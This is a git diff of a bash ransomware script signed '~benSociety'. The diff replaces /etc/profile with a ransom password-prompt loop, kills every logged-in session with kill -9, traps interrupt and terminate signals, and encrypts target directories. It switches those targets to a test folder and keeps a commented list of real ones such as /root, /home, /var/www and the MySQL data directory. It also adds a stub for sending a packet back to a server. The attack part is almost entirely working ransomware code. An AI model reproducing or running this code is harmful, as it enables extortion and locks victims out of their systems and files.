@@ -150,23 +150,37 @@ dec_loop() {
 }
 ################# MAIN ######################################
 setmsg() {
-    msg="while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != 'c402ee71a71a817cc23fe752dfeec1df3b759843' ]; do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' --passwordbox 'Congratulations,\\n\\nYou have been infected with a RANSOMWARE!!!!!\\nI know. Scary stuff.\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\n\\nLove,\\n\\n~benSociety' 20 50 3>&1 1>&2 2>&3 ); done"
+    message="Congratulations,\\n\\nYou have been infected with a RANSOMWARE!!!!!\\nI know. Scary stuff.\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\n\\nLove,\\n\\n~benSociety"
+    echo "Enter your new password:"
+    hsh=$(read | openssl sha1)
+    msg="\
+while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != \
+\"$hsh\" ];\
+do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' \
+--passwordbox \'$message\' 20 50 3>&1 1>&2 2>&3 );\
+done"
     mv /etc/profile /etc/profile.bak
     echo $msg > /etc/profile
 }
 
 lock() {
+    # Kill every session on the machine
     who -u | awk '{print $6}' | xargs kill -9 
 }
 
+# Send the packet back to the server
+send_packet() {
+    :
+}
 
 main() {
+    # Trap Signals
     trap '' INT
     trap '' TERM
     SOFT="YES"
     init
-    #targets="/root/Desktop/testing"
-    targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
+    targets="/root/Desktop/testing"
+    #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
     enc_loop "$targets"
     echo >> $PRIVATEKEY
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
